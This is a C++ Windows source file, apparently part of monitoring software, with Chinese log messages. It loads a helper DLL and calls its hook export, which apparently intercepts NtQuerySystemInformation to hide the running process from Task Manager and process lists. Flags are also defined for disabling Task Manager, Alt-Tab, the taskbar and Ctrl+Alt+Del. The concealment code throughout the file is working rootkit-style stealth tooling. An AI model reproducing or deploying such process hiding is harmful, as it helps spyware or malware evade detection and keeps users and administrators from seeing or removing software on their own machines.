
#include	<windows.h>            // required for all Windows applications
#include	<windowsx.h>

#include	<stdlib.h>
#include	<ras.h>
#include	<raserror.h>
#include	<lm.h>
#include	<iphlpapi.h>
#include	<tchar.h>

#include	"asrWMon.h"
#include	"config.h"
#include	"main.h"
#include	"qyRegToolProc.h"
#include	"qwmHideProcessCommProc.h"



//////////////////
// Call Disable with flags for items you want to disable; for example:
//
// CMyHideProcess::Disable(CTaskMgrKeys::ALL);
// 
class CMyHideProcess {
public:
	enum {
		CONST_taskMgr		= 0x01,		// disable task manager (Ctrl+Alt+Del)
		CONST_taskKeys		= 0x02,		// disable task keys (Alt-TAB, etc)
		CONST_taskBar		= 0x04,		// disable task bar
		CONST_taskList		= 0x08,		// disable listing process list
		CONST_ctrlAltDel	= 0x10,		// disable Ctrl+Alt+Del
		CONST_all			= 0xFFFF	// disable everything :(
	};
	//  static  BOOL  bVerRight(  char  *  pureDllName  );
	static  int  Disable(  TCHAR  *  pureDllName,  DWORD dwItem,BOOL bDisable  );
	
	static  BOOL  IsProcessListItemDisabled();

protected:
	static	HINSTANCE	hMyMyNtQuerySystemInformation;
};

BOOL CMyHideProcess::IsProcessListItemDisabled(){return hMyMyNtQuerySystemInformation!=NULL;}
HINSTANCE	CMyHideProcess::hMyMyNtQuerySystemInformation=NULL;


 BOOL  bTmpGetMyVer(  TCHAR  *  hideProcessDll,  char  *  ver0,  unsigned  int  size  )
{
	 BOOL		bRet		=	FALSE;
	 HINSTANCE	hInstance	=	NULL;
	 int (_cdecl * pf_getVer)(  char  *  ver,  unsigned  long  size  );
	 //  char	ver[32];

	 hInstance  =  LoadLibrary(  hideProcessDll  );
	 if  (  !hInstance  )  {
		 qyDisplayLastError(  "LoadLibrary failed"  );
		 traceLog(  _T(  "Can't load dll %s"  ),  hideProcessDll  );  
		 goto  errLabel;
	 }
				
	 pf_getVer = (int(*)(char  *,unsigned long))GetProcAddress(hInstance,CONST_getVerName);
	 if  (  !pf_getVer  )  goto  errLabel;
	 pf_getVer(  ver0,  size  );			
	 //  if  (  lstrcmpi(  ver,  CONST_qwmHelpDllVer  )  )  {
	 // 	 traceLogA(  "现有的dll的版本为%s, 与qwmSvr需要的dll版本%s不符",  ver,  CONST_qwmHelpDllVer  );  goto  errLabel;
	 //  }
	 
	 //  traceLogA(  "现有的dll的版本%s为正确的版本, ",  CONST_qwmHelpDllVer  );

	 bRet  =  TRUE;

errLabel:

	 if  (  hInstance  )  FreeLibrary(  hInstance  );
	 return  bRet;

}



//////////////////
// Disable task-key related stuff.
// 
// dwFlags  = what to disable
// bDisable = disable (TRUE) or enable (FALSE)
//
 int  CMyHideProcess::Disable(  TCHAR  *  CONST_hideProcessDll,  DWORD  dwFlags,  BOOL  bDisable  )
{	
	 int	iRet						=	-1;
	 TCHAR	hideProcessDll[MAX_PATH]	=	_T(  ""  );

	 if  (  getModuleDirAndFinalName(  hideProcessDll,  mycountof(  hideProcessDll  ),  NULL,  0  )  )  goto  errLabel;
	 lstrcpyn(  hideProcessDll  +  lstrlen(  hideProcessDll  ),  CONST_hideProcessDll,  sizeof(  hideProcessDll  )  -  lstrlen(  hideProcessDll  )  );

	 if  (  dwFlags  &  CONST_taskList  )  {
		 if  (  bDisable  &&  !IsProcessListItemDisabled(  )  )  {
			//  only work for windows 2000
			int (_cdecl *pfnHook)(DWORD);
	
			hMyMyNtQuerySystemInformation  =  LoadLibrary(  hideProcessDll  );
			if  (  !hMyMyNtQuerySystemInformation  )  {
				traceLogA(  "load dll to hide process failed"  );  goto  errLabel;
			}
			pfnHook = (int(*)(DWORD))GetProcAddress(hMyMyNtQuerySystemInformation,CONST_hideHookName);
			if  (  pfnHook  )  pfnHook(GetCurrentProcessId());			
		}
		if  (  !bDisable  &&  IsProcessListItemDisabled(  )  )  {
			int (_cdecl *pfnUnhook)();
			if  (  hMyMyNtQuerySystemInformation  )  {
				pfnUnhook = (int(*)())GetProcAddress(hMyMyNtQuerySystemInformation,CONST_showHookName);
				if  (  pfnUnhook  )  pfnUnhook();
				FreeLibrary(hMyMyNtQuerySystemInformation);
				hMyMyNtQuerySystemInformation=NULL;
			}			
		}
	}

	iRet  =  0;

errLabel:
	return  iRet;
}


 extern  "C"  BOOL  bMyHideSupportedOs(  int  iPlatformId,  void  *  p1,  void  *  p2  )
{
	 switch  (  iPlatformId  )  {
			 case  CONST_qyPlatform_unknown:
			 case  CONST_qyPlatform_win32:
			 case  CONST_qyPlatform_win95:
			 case  CONST_qyPlatform_win98:
			 case  CONST_qyPlatform_winme:
			 case  CONST_qyPlatform_nt:
				   return  FALSE;
			 default:
					break;
	 }
	 return  TRUE;
}


 QY_DMITEM  CONST_qwmHelpDllVerTable[]  =
{
	{	0,	_T(  CONST_hideProcessDll0  ),	(  TCHAR  *  )CONST_qwmHelpDllVer  ,	},
	{	1,	_T(  CONST_hideProcessDll1  ),	(  TCHAR  *  )CONST_qwmHelpDllVer,	},
	{	2,	_T(  CONST_qwmHelp2Dll  ),		(  TCHAR  *  )CONST_qwmHelp2DllVer,	},
	{	3,	_T(  CONST_qwmHelp3Dll  ),		(  TCHAR  *  )CONST_qwmHelp3DllVer,	},
	{	4,	_T(  CONST_qwmRdHelpDll  ),		(  TCHAR  *  )CONST_qwmRdHelpDllVer,	},
	{	5,	_T(  CONST_qwmRdDll  ),			(  TCHAR  *  )CONST_qwmRdDllVer,		},
	{	-1,	NULL,											},
};


 //  2004/11/15增加对操作系统的判断，对NT系列，返回TRUE，表明任何DLL都OK
 extern  "C"  BOOL  bMyQwmHelpDllVerRight(  int  iPlatformId,  TCHAR  *  pureDllName,  PF_bCommonHandler  pfbSupportedOs  )
{
	 BOOL			bRet	=	FALSE;
	 char			ver[32];
	 QY_DMITEM	*	pItem;
	 TCHAR			hideProcessDll[MAX_PATH  +  1];

	 //  if  (  !bMyHideSupportedOs(  iPlatformId  )  )  return  TRUE;
	 if  (  pfbSupportedOs  &&  !pfbSupportedOs(  (  void  *  )iPlatformId,  0,  0  )  )  return  TRUE;


	 GetSystemDirectory(  hideProcessDll,  mycountof(  hideProcessDll  )  );
	 trailDir(  hideProcessDll,  mycountof(  hideProcessDll  )  );
	 lstrcpyn(  hideProcessDll  +  lstrlen(  hideProcessDll  ),  pureDllName,  mycountof(  hideProcessDll  )  -  lstrlen(  hideProcessDll  )  );

	 //  return  CMyHideProcess::bVerRight(  pureDllName  );
	 if  (  !bTmpGetMyVer(  hideProcessDll,  ver,  mycountof(  ver  )  )  )  return  FALSE;

	 for  (  pItem  =  CONST_qwmHelpDllVerTable;  pItem->type  !=  -1;  pItem  ++  )  {
		  if  (  !lstrcmpi(  pureDllName,  pItem->des  )  )  break;	 
	 }
	 if  (  pItem->type  ==  -1  )  goto  errLabel;
	 if  (  strcmpi(  (  char  *  )pItem->pData,  ver  )  )  goto  errLabel;
	 
	 bRet  =  TRUE;

	 //  if  (  lstrcmpi(  ver,  CONST_qwmHelpDllVer  )  )  {
	 // 	 traceLogA(  "现有的dll的版本为%s, 与qwmSvr需要的dll版本%s不符",  ver,  CONST_qwmHelpDllVer  );  goto  errLabel;
	 //  }
	 
	 //  traceLogA(  "现有的dll的版本%s为正确的版本, ",  CONST_qwmHelpDllVer  );

errLabel:

	 traceLogA(  "%s的版本%s, 现有的为%s, qwmSvr需要的为%s",  pureDllName,  (  bRet  ?  "正确"  :  "不符"  ),  ver,  pItem->pData  );
	 
	 return  bRet;

}

 extern  "C"  int  myHideProcess(  int  iPlatformId,  TCHAR  *  pureDllName  )
{
	 int	iRet	=	-1;

	 if  (  !bMyHideSupportedOs(  iPlatformId,  0,  0  )  )  return  -1;
	 if  (  !bMyQwmHelpDllVerRight(  iPlatformId,  pureDllName,  (  PF_bCommonHandler  )bMyHideSupportedOs  )  )  {
		 traceLogA(  "myHideProcess: dll 版本不符，不能隐藏"  );  goto  errLabel;
	 }
	 if  (  !CMyHideProcess::IsProcessListItemDisabled(  )  &&  CMyHideProcess::Disable(  pureDllName,  CMyHideProcess::CONST_taskList,  TRUE  )  )  {
		 traceLogA(  "进程隐藏失败"  );  goto  errLabel;
	 }
	 traceLogA(  "新式的进程隐藏"  );
	 iRet  =  0;
errLabel:
	 return  iRet;
}

 extern  "C"  void  myShowProcess(  int  iPlatformId,  TCHAR  *  pureDllName  )
{
	 if  (  !bMyHideSupportedOs(  iPlatformId,  0,  0  )  )  return;
	 if  (  CMyHideProcess::Disable(  pureDllName,  CMyHideProcess::CONST_taskList,  FALSE  )  )  {
		 traceLogA(  "取消进程隐藏失败"  );  goto  errLabel;
	 }
	 traceLogA(  "取消新式的进程隐藏"  );	 
errLabel:
	 return;
}

/*
void CMainFrame::OntestHideProcess() 
{
	// TODO: Add your command handler code here
		CMyHideProcess::Disable(CMyHideProcess::TASKLIST,
		!CMyHideProcess::IsProcessListItemDisabled());

	
}
*/


